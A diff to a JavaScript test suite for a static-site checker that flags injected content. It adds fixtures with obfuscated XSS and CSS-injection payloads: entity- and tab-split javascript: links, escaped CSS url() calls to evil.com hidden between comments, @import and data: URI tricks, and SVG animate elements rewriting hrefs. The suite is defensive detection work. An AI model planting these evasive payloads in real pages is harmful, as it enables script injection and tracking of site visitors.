@@ -6,7 +6,7 @@ import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { execFileSync, spawnSync } from "node:child_process";
-import { checkSite } from "../scripts/check-site.mjs";
+import { checkSite, recordSite } from "../scripts/check-site.mjs";
 
 const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
 let base; // a built site
@@ -174,7 +174,7 @@ flagged("handler reused with new code", "details.html", `<img src="" onerror="fe
 flagged("javascript: href with entity", "faq.html", `<a href="&#106;avascript:alert(1)">x</a>`, /javascript:/);
 flagged("javascript: href with tab", "faq.html", `<a href="java&#9;script:alert(1)">x</a>`, /javascript:/);
 flagged("javascript: href with leading space and control character", "faq.html", `<a href=" &#1;javascript:alert(1)">x</a>`, /javascript:/);
-flagged("data: href", "faq.html", `<a href="data:text/html,x">x</a>`, /data:/);
+flagged("data: href", "faq.html", `<a href="data:text/html,x">x</a>`, /data/);
 
 test("flagged: CSS image-set and escaped url in the stylesheet", () => {
   has(checkSite(copy(change("css/styles.css", (t) => t + '\np{background:image-set("//evil.com/a.png" 1x)}\n'))), EVIL);
@@ -206,4 +206,61 @@ test("content changes with a new hotel link and a new image are fine", () => {
       '<p>New words.</p><a href="https://example-hotel.com">Hotel</a><img src="images/brand-new.ico" alt="x"></body>'))(d);
   });
   assert.deepEqual(checkSite(site), []);
+});
+
+// ---- fix round 2: conservative CSS reading, data: URIs, animation elements -----
+
+const css = (payload) => (d) => fs.appendFileSync(path.join(d, "css/styles.css"), `\n${payload}\n`);
+const style = (payload) => into("faq.html", `<style>${payload}</style>`);
+
+for (const [name, payload] of [
+  ["a url hidden between two string comments", 'p{content:"/*"} q{background:url(https://evil.com/a)} r{content:"*/"}'],
+  ["the same with an escaped url", 'p{content:"/*"} q{background:url("\\2f\\2f evil.com/a")} r{content:"*/"}'],
+]) {
+  test(`flagged: ${name}, in the stylesheet and in a <style>`, () => {
+    has(checkSite(copy(css(payload))), EVIL);
+    has(checkSite(copy(style(payload))), EVIL);
+  });
+}
+
+test("flagged: a quoted @import of a data: address, plain or escaped", () => {
+  has(checkSite(copy(style('@import "data:text/css;base64,cHt9";'))), /another stylesheet/);
+  has(checkSite(copy(style('@\\69mport "data:text/css;base64,cHt9";'))), /another stylesheet/);
+});
+
+test("flagged: any new @import, in a stylesheet or a style attribute", () => {
+  has(checkSite(copy(css('@import "local.css";'))), /another stylesheet/);
+  has(checkSite(copy(css('@import url(local.css);'))), /another stylesheet/);
+  has(checkSite(copy(into("faq.html", '<p style="@import \'x.css\'">x</p>'))), /another stylesheet/);
+});
+
+test("flagged: a new or changed data: address in the stylesheet or a page", () => {
+  has(checkSite(copy(change("css/styles.css", (t) => t.replace("stroke-width='1.5'", "stroke-width='1.6'")))), /data address/);
+  has(checkSite(copy(css("p{background:url(data:image/png;base64,AAAA)}"))), /data address/);
+  has(checkSite(copy(into("faq.html", '<img src="data:image/png;base64,AAAA" alt="">'))), /data address/);
+  has(checkSite(copy(into("faq.html", '<a href="data:text/html,x">x</a>'))), /data/);
+});
+
+flagged("svg set animating an href", "faq.html", '<svg><image><set attributeName="href" to="https:&#47;&#47;evil.com/a"/></image></svg>');
+flagged("svg animate with a javascript: value", "faq.html", '<svg><a><animate attributeName="href" values="javascript:alert(1)"/></a></svg>', /javascript:|animation/);
+flagged("a new svg animation element is counted", "faq.html", "<svg><animate/></svg>", /<animate>/);
+flagged("a foreignObject element", "faq.html", "<svg><foreignObject></foreignObject></svg>", /foreignobject/i);
+
+test("ordinary changes still pass", () => {
+  const ok = [
+    change("css/theme.css", (t) => t.replace(/#[0-9a-fA-F]{6}/, "#123456")),
+    change("css/styles.css", (t) => t + "\nhtml{scroll-behavior:smooth}\n/* a note */\n"),
+    into("faq.html", "<p>" + "A much longer paragraph of new words. ".repeat(40) + "</p>"),
+    into("faq.html", '<p>See <a href="https://www.example.com">this</a>.</p>'),
+    into("travel.html", '<a href="https://booking.example/room" class="btn" target="_blank" rel="noopener noreferrer">Book</a>'),
+  ];
+  for (const edit of ok) assert.deepEqual(checkSite(copy(edit)), []);
+});
+
+test("turning the after-party map on passes a baseline recorded while it was off", () => {
+  const off = copy(change("after-party.html", (t) => t.replace(/ data-map-src="[^"]*"/, "")));
+  assert.ok(!/data-map-src/.test(fs.readFileSync(path.join(off, "after-party.html"), "utf8")));
+  const record = path.join(tmpRoot, "map-off.json");
+  recordSite(off, record);
+  assert.deepEqual(checkSite(copy(), { protectedFile: record }), []);
 });
